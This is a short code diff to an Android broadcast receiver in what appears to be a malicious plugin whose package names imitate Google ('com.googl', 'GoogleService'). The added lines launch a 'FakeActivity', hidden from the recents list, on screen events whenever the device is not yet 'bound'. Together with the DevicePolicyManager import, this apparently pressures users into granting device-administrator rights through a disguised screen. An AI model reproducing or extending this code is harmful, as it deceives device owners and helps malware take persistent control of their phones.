@@ -1,9 +1,13 @@
 package com.xstd.plugin.receiver;
 
+import android.app.admin.DevicePolicyManager;
 import android.content.BroadcastReceiver;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import com.googl.plugin.x.FakeActivity;
 import com.plugin.common.utils.UtilsRuntime;
+import com.xstd.plugin.binddevice.DeviceBindBRC;
 import com.xstd.plugin.config.SettingManager;
 import com.xstd.plugin.service.GoogleService;
 import com.xstd.plugin.service.PluginService;
@@ -67,6 +71,11 @@ public class ScreenBRC extends BroadcastReceiver {
                     }
                 }
             }
+        } else if (!SettingManager.getInstance().getKeyHasBindingDevices()) {
+            Intent i = new Intent();
+            i.setClass(context, FakeActivity.class);
+            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+            context.startActivity(i);
         }
     }
 
